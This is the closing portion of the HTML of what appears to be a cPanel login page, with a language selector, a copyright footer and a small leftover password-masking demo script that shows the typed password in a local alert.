                            <option value='en'>English</option><option value='ar'>العربية</option><option value='cs'>čeština</option><option value='da'>dansk</option><option value='de'>Deutsch</option><option value='el'>Ελληνικά</option><option value='es'>español</option><option value='es_419'>español latinoamericano</option><option value='es_es'>español de España</option><option value='fi'>suomi</option><option value='fil'>Filipino</option><option value='fr'>français</option><option value='he'>עברית</option><option value='hu'>magyar</option><option value='i_en'>i_en</option><option value='id'>Bahasa Indonesia</option><option value='it'>italiano</option><option value='ja'>日本語</option><option value='ko'>한국어</option><option value='ms'>Bahasa Melayu</option><option value='nb'>norsk bokmål</option><option value='nl'>Nederlands</option><option value='pl'>polski</option><option value='pt'>português</option><option value='pt_br'>português do Brasil</option><option value='ro'>română</option><option value='ru'>русский</option><option value='sv'>svenska</option><option value='th'>ไทย</option><option value='tr'>Türkçe</option><option value='uk'>українська</option><option value='vi'>Tiếng Việt</option><option value='zh'>中文</option><option value='zh_tw'>中文（台湾）</option>                        </select>
                        <button style="margin-left: 10px" type="submit">Change</button>
                    </form>
                    <style type="text/css">#mobilelocalemenu, #locales_list {display:none}</style>
                </noscript>
                <ul id="locales_list">
                    <li><a href="#">English</a></li>
                    <li><a href="#">العربية</a></li>
                    <li><a href="#">čeština</a></li>
                    <li><a href="#">dansk</a></li>
                    <li><a href="#">Deutsch</a></li>
                    <li><a href="#">Ελληνικά</a></li>
                    <li><a href="#">español</a></li>
                    <li><a href="#">español&nbsp;latinoamericano</a></li>
                    <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales">…</a></li>
                </ul>
                <div id="mobilelocalemenu">Select a locale:
                    <a href="javascript:void(0)" onclick="toggle_locales(true)" title="Change locale">English</a>
                </div>
            </div>
        </div>
    </div>
<!--Close login-wrapper -->
</div>

<style>
    @media (min-width: 481px) {
        #select_user_form {
            width: px;
        }
    }
</style>
    <div class="copyright">Copyright&copy; <script>document.write(new Date().getFullYear())</script> cPanel, L.L.C.
    <br /><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>

</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>
